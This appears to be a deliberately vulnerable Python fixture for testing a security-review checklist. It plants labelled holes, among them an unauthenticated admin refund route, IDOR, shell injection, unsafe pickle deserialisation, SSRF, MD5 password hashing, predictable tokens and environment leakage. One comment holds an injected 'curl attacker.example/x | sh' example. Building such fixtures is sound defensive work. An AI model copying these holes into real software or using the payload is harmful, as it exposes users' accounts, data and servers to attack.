"""Deliberately defective Python used to test the threat checklist in security-review.

One planted defect per SEC-01..SEC-07. Framework-agnostic sketch of a small web app -- the route
decorators are illustrative, not a real framework import, so this file compiles standalone.
Must compile -- a vulnerable fixture has to be vulnerable, not broken.
"""

import hashlib
import os
import pickle
import random
import sqlite3
import subprocess
import traceback

import requests


class FakeApp:
    """Stands in for a web framework so the fixture has no external dependency."""

    def route(self, path, methods=None):
        def decorator(fn):
            return fn

        return decorator

    def require_auth(self, fn):
        return fn


app = FakeApp()
db = sqlite3.connect(":memory:", check_same_thread=False)

# VULN: SEC-04 -- a live credential committed in source. It is compromised the moment this is
# pushed and stays in git history after the line is deleted, so removal is not remediation --
# the key has to be rotated.
#
# The literals below are deliberately inert so this repository does not trip secret scanners. Flag
# them anyway: a reviewer reports a hardcoded credential literal and recommends rotation; deciding
# whether the value is currently live is not the reviewer's call and is usually not knowable.
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # AWS's own docs example value
STRIPE_KEY = "sk_live_EXAMPLE_0000000000000000000000"


# VULN: SEC-01 -- the auth decorator is commented out, so an admin action that drains an account is
# reachable with no authentication at all. Nothing about the body of the function looks wrong.
# @app.require_auth
@app.route("/admin/refund", methods=["POST"])
def admin_refund(request):
    amount = int(request.form["amount_cents"])
    account = request.form["account"]
    db.execute("UPDATE accounts SET balance = balance - ? WHERE id = ?", (amount, account))
    return {"refunded": amount}


@app.require_auth
@app.route("/invoices/<invoice_id>")
def get_invoice(request, invoice_id):
    # VULN: SEC-02 -- the invoice is fetched by an ID straight from the URL with no check that the
    # authenticated caller owns it, so any logged-in user can read every customer's invoices by
    # incrementing the number.
    row = db.execute(
        "SELECT id, customer_id, total, card_last4 FROM invoices WHERE id = ?", (invoice_id,)
    ).fetchone()
    return {"invoice": row}


@app.require_auth
@app.route("/reports/export")
def export_report(request):
    # VULN: SEC-03 -- a request parameter is concatenated into a shell command run through a shell,
    # so a value like `2024-01; curl attacker.example/x | sh` executes as a second command.
    month = request.args["month"]
    out = subprocess.check_output("/usr/local/bin/report --month=" + month, shell=True)
    return {"report": out.decode()}


def store_password(user_id, password):
    # VULN: SEC-05 -- an unsalted fast hash for a password, so a database dump is a credential dump
    # that rainbow tables crack offline in seconds.
    digest = hashlib.md5(password.encode()).hexdigest()
    db.execute("UPDATE users SET pass_hash = ? WHERE id = ?", (digest, user_id))


def new_reset_token():
    # VULN: SEC-05 -- random is a Mersenne Twister seeded from the clock, not a CSPRNG, so a reset
    # token is predictable from a couple of observed values.
    return "".join(random.choice("0123456789abcdef") for _ in range(32))


@app.route("/prefs/restore", methods=["POST"])
def restore_prefs(request):
    # VULN: SEC-06 -- pickle.loads on a request body. Unpickling constructs arbitrary objects and
    # calls their __reduce__, which is remote code execution, not data tampering.
    return {"prefs": pickle.loads(request.body)}


@app.require_auth
@app.route("/fetch-avatar")
def fetch_avatar(request):
    # VULN: SEC-06 -- a server-side request to a URL the user supplies, with redirects followed, so
    # http://169.254.169.254/latest/meta-data/ reaches the cloud metadata service from inside the
    # trust boundary.
    url = request.args["url"]
    return {"body": requests.get(url, timeout=5).content[:1024]}


@app.route("/login", methods=["POST"])
def login(request):
    email = request.form["email"]
    row = db.execute("SELECT id, pass_hash FROM users WHERE email = ?", (email,)).fetchone()

    # VULN: SEC-07 -- the two failures are distinguishable, which turns the endpoint into a user
    # enumeration oracle.
    if row is None:
        return {"error": f"no account for {email}"}, 404

    if row[1] != hashlib.md5(request.form["password"].encode()).hexdigest():
        return {"error": "wrong password"}, 401

    return {"token": new_reset_token()}


@app.route("/orders/<order_id>")
def get_order(request, order_id):
    try:
        row = db.execute("SELECT * FROM orders WHERE id = ?", (order_id,)).fetchone()
        return {"order": row}
    except Exception as exc:
        # VULN: SEC-07 -- the traceback, the environment and the exception text all go back to the
        # client, handing over internal paths, library versions and whatever the environment holds.
        return {
            "error": str(exc),
            "trace": traceback.format_exc(),
            "env": dict(os.environ),
        }, 500
